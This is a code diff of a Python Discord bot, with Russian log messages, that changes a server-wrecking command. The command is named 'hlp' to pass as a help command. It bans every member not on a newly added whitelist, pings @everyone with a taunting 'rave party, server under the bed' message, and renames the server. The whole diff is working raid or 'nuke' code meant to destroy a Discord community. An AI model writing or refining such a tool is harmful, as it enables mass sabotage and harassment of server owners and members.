@@ -5,6 +5,8 @@ from colorama import Fore, init
 from os import system, name
 init()
 
+whit = [сюда айди пользователей через запятую]
+
 if name == "nt":
         _ = system("cls")
 
@@ -14,6 +16,7 @@ else:
 intents = discord.Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix='$', intents=intents )
+
 
 @client.event
 async def on_ready():
@@ -31,20 +34,27 @@ async def on_ready():
 
 @client.command()
 async def hlp(ctx):
-
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
     ban = 0
     bany = 0
+    wta = 0
     for member in ctx.guild.members:
-        try:
+        if member.id not in whit:
+            try:
+                ban += 1
+                await member.ban()
+                bany += 1
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
+            except:
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
+                continue
+            
+        elif member.id in whit:
             ban += 1
-            await member.ban()
-            bany += 1
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
-        except:
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
-            continue
-    print(f"{Fore.WHITE}> {Fore.RED}Было {Fore.WHITE} {ban} {Fore.RED} человек, а забанил {Fore.WHITE} {bany} {Fore.RED} человек {Fore.WHITE}.")
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
+            wta += 1
+
+    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
     
     await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
     await ctx.guild.edit(name="Концерт фейса")
@@ -145,7 +155,7 @@ async def gamehelp(ctx):
 
 
 try:
-    client.run('токен сюда')
+    client.run('Токен')
 except Exception:
     pass
 except KeyboardInterrupt:
